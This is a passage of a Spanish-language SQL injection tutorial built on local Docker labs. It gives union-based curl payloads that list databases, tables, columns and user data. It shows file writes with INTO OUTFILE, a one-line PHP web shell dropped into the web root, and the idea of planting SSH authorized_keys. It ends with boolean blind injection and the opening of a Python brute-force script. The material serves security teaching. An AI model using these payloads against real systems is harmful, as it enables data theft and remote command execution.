</span></span><span class=line><span class=cl>bash-4.2# mysql -u root -p
</span></span><span class=line><span class=cl>Enter password:
</span></span></code></pre></div><p>Si miramos las bases de datos con <code>show databases;</code> vemos que existe una base de datos que es predeterminada llamada <code>information_schema</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql&gt; show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> my_database        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> sys                <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=m>5</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span></code></pre></div><p>Dentro de la base de datos information_schema existe una tabla entre muchas llamada <code>schemata</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql&gt; use information_schema
</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database changed
</span></span><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_information_schema          <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> CHARACTER_SETS                        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATIONS                            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLUMNS                               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ....                                  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> SCHEMATA                              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ...                                   <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=m>61</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span></code></pre></div><p>Y por último dentro de la tabla schemata, concretamente en la columna &lsquo;schema_name&rsquo;&rsquo; están los nombres de las bases de datos.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from schemata<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>+--------------+--------------------+----------------------------+------------------------+----------+
</span></span><span class=line><span class=cl><span class=p>|</span> CATALOG_NAME <span class=p>|</span> SCHEMA_NAME        <span class=p>|</span> DEFAULT_CHARACTER_SET_NAME <span class=p>|</span> DEFAULT_COLLATION_NAME <span class=p>|</span> SQL_PATH <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+--------------------+----------------------------+------------------------+----------+
</span></span><span class=line><span class=cl><span class=p>|</span> def          <span class=p>|</span> information_schema <span class=p>|</span> utf8                       <span class=p>|</span> utf8_general_ci        <span class=p>|</span> NULL     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> def          <span class=p>|</span> my_database        <span class=p>|</span> latin1                     <span class=p>|</span> latin1_swedish_ci      <span class=p>|</span> NULL     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> def          <span class=p>|</span> mysql              <span class=p>|</span> latin1                     <span class=p>|</span> latin1_swedish_ci      <span class=p>|</span> NULL     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> def          <span class=p>|</span> performance_schema <span class=p>|</span> utf8                       <span class=p>|</span> utf8_general_ci        <span class=p>|</span> NULL     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> def          <span class=p>|</span> sys                <span class=p>|</span> utf8                       <span class=p>|</span> utf8_general_ci        <span class=p>|</span> NULL     <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------+--------------------+----------------------------+------------------------+----------+
</span></span><span class=line><span class=cl><span class=m>5</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span></code></pre></div><p>Si volvemos al payload que teníamos antes, vemos que lo que estamos diciendo es, que meta la columna &lsquo;schema_name&rsquo; (la cual contiene los nombres de las bases de datos) en la columna numero 2. Despues le decimos con from donde está esa columna, que está en la base de datos &lsquo;information_schema&rsquo; y en la tabla <code>schemata</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=k>schema_name</span><span class=p>,</span><span class=k>NULL</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>informationschema</span><span class=p>.</span><span class=n>schemata</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,schema_name,NULL from information_schema.schemata-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: information_schema
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: my_database
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: mysql
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: performance_schema
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: sys
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><p>En este caso vemos que se añade una nueva fila con &lsquo;Nombre: &rsquo; y &lsquo;Rol: &rsquo; Por cada base de datos encontrada, pero esto no siempre va a ser tan fácil en algunas webs puede ser que solo nos muestren el primer dato. En estos casos podemos usar delimitadores para que se vayan mostrando las bases de datos como en el siguiente ejemplo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,schema_name,NULL from information_schema.schemata limit 0,1-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: information_schema
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: mysql
</span></span><span class=line><span class=cl>Rol:
</span></span></code></pre></div><p>Esto ya empieza a tener muy buena pinta&mldr; tenemos la capacidad de enumerar las bases de datos.</p><h3 id=enumeración-de-las-tablas>Enumeración de las tablas</h3><p>Ahora toca enumerar las tablas, el procedimiento es bastante parecido.</p><p>Dentro de la base de datos information_schema hay una tabla llamada tables la cual contiene el nombre de todas las tablas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_information_schema          <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> CHARACTER_SETS                        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATIONS                            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ...                                   <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> TABLES                                <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ...                                   <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span></code></pre></div><p>Dentro de la tabla <code>tables</code> hay una columna llamada table_name con el nombre de las tablas, y otra llamada table_schema la cual tiene el nombre de la base de datos a la cual pertenece la tabla. Por ejemplo en la siguiente instrucción se muestran las tablas de la base de datos &lsquo;my_database&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql&gt; <span class=k>select</span> table_name from tables where <span class=nv>table_schema</span> <span class=o>=</span> <span class=s1>&#39;my_database&#39;</span> <span class=p>;</span>
</span></span><span class=line><span class=cl>+------------+
</span></span><span class=line><span class=cl><span class=p>|</span> table_name <span class=p>|</span>
</span></span><span class=line><span class=cl>+------------+
</span></span><span class=line><span class=cl><span class=p>|</span> mi_tabla   <span class=p>|</span>
</span></span><span class=line><span class=cl>+------------+
</span></span></code></pre></div><p>Esto aplicado a la inyección quedaria de la siguiente forma</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>union <span class=k>select</span> NULL,table_name,NULL from information_schema.tables where <span class=nv>table_schema</span> <span class=o>=</span> <span class=s1>&#39;my_database&#39;</span>-- -
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = &#39;my_database&#39;-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: mi_tabla
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><p>Igual que con las bases de datos si es una inyección en la cual solo vemos el primer dato, podemos usar delimitadores, para ir viendo los nombres uno por uno</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = &#39;my_database&#39; limit 0,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: mi_tabla
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><h3 id=columnas>Columnas</h3><p>Una vez tenemos las tablas, tocan las columnas.</p><p>Dentro de la base de datos information_schema hay una tabla llamada columns en la cual están los nombres de las columnas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_information_schema          <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> CHARACTER_SETS                        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATIONS                            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> COLUMNS                               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ...                                   <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl><span class=m>61</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span></code></pre></div><p>De toda esta tabla vamos a usar solo 3 columnas:</p><ul><li>column_name: Contiene el nombre de las columnas</li><li>table_name: Contiene el nombre de la tabla a la cual pertenece esa columna</li><li>table_schema: Contiene el nombre de la base de datos a la cual pertenece la columna</li></ul><pre tabindex=0><code>mysql&gt; select column_name from columns where table_name = &#39;mi_tabla&#39; and table_schema = &#39;my_database&#39;;
+-------------+
| column_name |
+-------------+
| id          |
| nombre      |
| rol         |
+-------------+
3 rows in set (0.00 sec)
</code></pre><p>Esto aplicado a la inyección quedaría de la siguiente forma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,column_name,NULL from information_schema.columns where table_name = &#39;mi_tabla&#39; and table_schema = &#39;my_database&#39;-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: id
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: nombre
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: rol
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><p>Otra vez si solo nos muestra un dato, podemos usar delimitadores para ir viéndolos poco a poco.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39;limit 0,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: id
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39;limit 1,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: nombre
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39;limit 2,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: rol
</span></span><span class=line><span class=cl>Rol:
</span></span></code></pre></div><h3 id=data>Data</h3><p>Por último solo nos quedaría ver el contenido de las columnas que hemos encontrado. La petición ahora es mucho más sencilla. En mysql se vería así</p><pre tabindex=0><code>mysql&gt; select nombre from mi_tabla;
+--------+
| nombre |
+--------+
| Joan   |
| Quim   |
| Andreu |
+--------+
</code></pre><p>Y la inyección sería simplemente la siguiente</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,nombre,NULL from my_database.mi_tabla-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: Quim
</span></span><span class=line><span class=cl>Rol: 
</span></span><span class=line><span class=cl>Nombre: Andreu
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,nombre,rol from my_database.mi_tabla-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: Quim
</span></span><span class=line><span class=cl>Rol: user
</span></span><span class=line><span class=cl>Nombre: Andreu
</span></span><span class=line><span class=cl>Rol: user
</span></span></code></pre></div><p>En este caso podemos ver el contenido de varias columnas a la vez de forma simple, pero no siempre es así. Si solo podemos mostrar datos en una columna podemos concatenar datos con &lsquo;group_concat()&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>group_concat</span><span class=p>(</span><span class=n>nombre</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>rol</span><span class=p>)</span><span class=w> 
</span></span></span></code></pre></div><p>Con esto estaremos mostrando el contenido de la columna nombre y de la columna rol en la misma columna.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,group_concat(nombre,&#39;:&#39;,rol) ,NULL from my_database.mi_tabla-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: Joan:admin,Quim:user,Andreu:user
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><p>Si solo nos muestra el primer dato podemos usar delimitadores para ir mostrándolos poco a poco</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,nombre,rol from my_database.mi_tabla limit 0,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,nombre,rol from my_database.mi_tabla limit 1,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Quim
</span></span><span class=line><span class=cl>Rol: user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=&#39; union select NULL,nombre,rol from my_database.mi_tabla limit 2,1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Andreu
</span></span><span class=line><span class=cl>Rol: user
</span></span></code></pre></div><h3 id=subida-de-archivos>Subida de archivos</h3><p>Aparte de sacar información de la base de datos también podemos probar de escribir archivos. Esto lo haremos poniendo el contenido que queremos meter en el archivo en una columna y luego lo redirigiremos con &lsquo;into outfile&rsquo; al &lsquo;/tmp/sqli&rsquo;</p><pre tabindex=0><code>?nombre=joan&#39; union select NULL,&#34;holaaaaaa&#34;,NULL into outfile &#34;/tmp/sqli&#34;-- -
</code></pre><p>Para comprobar si ha funcionado vamos a abrir una terminal con el contendor. Primero buscaremos el id del contenedor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; sudo docker ps
</span></span><span class=line><span class=cl>CONTAINER ID   IMAGE            COMMAND                  CREATED          STATUS          PORTS                                                  NAMES
</span></span><span class=line><span class=cl>c4b17fc1716b   php:7.4-apache   <span class=s2>&#34;docker-php-entrypoi…&#34;</span>   <span class=m>13</span> seconds ago   Up <span class=m>12</span> seconds   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                      lab1_web_1
</span></span><span class=line><span class=cl>5f7d54a374b0   mysql:5.7        <span class=s2>&#34;docker-entrypoint.s…&#34;</span>   <span class=m>13</span> seconds ago   Up <span class=m>12</span> seconds   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   lab1_db_1
</span></span></code></pre></div><p>Después ejecutaremos una bash en el contenedor mysql</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; sudo docker <span class=nb>exec</span> -it 5f7d54a374b0 bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# ls
</span></span><span class=line><span class=cl>bin   dev			  entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
</span></span><span class=line><span class=cl>boot  docker-entrypoint-initdb.d  etc		 lib   media  opt  root  sbin  sys  usr
</span></span></code></pre></div><p>Por último, comprobamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# ls /tmp
</span></span><span class=line><span class=cl>a  sqli  testing_sqli
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# cat /tmp/sqli 
</span></span><span class=line><span class=cl>1	Joan	admin
</span></span><span class=line><span class=cl><span class=se>\N</span>	holaaaaaa	<span class=se>\N</span>
</span></span></code></pre></div><p>¿De qué nos sirve esto?</p><p>Podemos usar esta técnica para por ejemplo modificar el authorized_keys de un usuario del sistema para poder entrar sin proporcionar contraseña. El authorized_keys por defecto está en &lsquo;/home/(user)/.ssh/authorized_keys&rsquo;</p><p>También lo podemos usar para crear un nuevo archivo php en la web con código malicioso el cual nos permita ejecutar comandos.</p><pre tabindex=0><code>&#39; union select NULL,&#34;&lt;?php system($_GET[&#39;cmd&#39;]);&#34;,NULL into outfile &#34;/var/www/html/cmd.php&#34;-- -
</code></pre><p>Esto básicamente lo que hace es crear un archivo en /var/www/html que es la ruta por defecto para las webs. El archivo que crea le mete codigo php el cual hace que todo lo que reciba por GET, por el parámetro cmd (localhost/cmd.php?cmd=) lo ejecutara con la función system. Lo que permitirá tener una ejecución remota de comandos.</p><p>En el laboratorio 1 no se puede probar, ya que la web y la base de datos están en contenedores distintos.</p><h2 id=booleana>Booleana</h2><div class="callout callout-note d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="info-circle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 9h.01"/><path d="M11 12h1v4h1"/></svg><div class=callout-content><div class=callout-title><p>Laboratorio</p></div><div class=callout-body><p>Para la explicación se va a usar el laboratorio 3:</p><ul><li><p>Descarga el <a href=labs/lab3.zip>laboratorio</a></p></li><li><p>Descomprímelo y entra a la carpeta</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>unzip lab3.zip
</span></span><span class=line><span class=cl><span class=nb>cd</span> lab3
</span></span></code></pre></div><p>Despliega el contenedor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker-compose up --build
</span></span></code></pre></div></div></div></div><p>En este tipo de inyecciones no vamos a ver el output de las querys maliciosas.</p><p>Empezamos mandando una petición normal, y al final le ponemos algo que sea True como por ejemplo (1=1, a=a, &lsquo;a&rsquo;=&lsquo;a&rsquo;), mirando las respuestas podemos ver que cuando la solicitud es correcta vemos el Nombre y el Rol, pero cuando la petición es incorrecta no sale ni el Nombre ni el Rol</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and 1=1 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and 1=2 -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                            
</span></span></code></pre></div><p>Esto dependiendo de la web puede cambiar lo que se muestra o se deja de mostrar, a veces pueden ser detalles muy pequeños</p><p>Para sacar información con este método podemos hacer una petición diciendo que el primer carácter de el primer base de datos es una &rsquo;m&rsquo;, en el caso de que la afirmación sea cierta veremos el Nombre y el Rol, de caso contrario que no acertemos el caracter no nos saldrá nada.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;m&#39;-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;a&#39;-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>      
</span></span></code></pre></div><p>De forma manual tardaríamos una eternidad en sacar la información de la base de datos así que podemos automatizarlo con python</p><h3 id=base-de-datos>Base de datos</h3><p>Para enumerar las bases de datos vamos a usar el siguiente payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>joan</span><span class=s1>&#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;</span><span class=n>m</span><span class=s1>&#39;-- -
</span></span></span></code></pre></div><p>En el script declaramos una variable llamada mensaje la cual contiene el mensaje que devuelve la web cuando la query sql es correcta, cada vez que el script lanze una petición comprobara si en la respuesta está este mensaje. Después calculamos la cantidad de bases de datos. Por último se calcula el &ldquo;Length&rdquo; de cada nombre de la base de datos y se hace fuerza bruta para sacar cada caracter.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
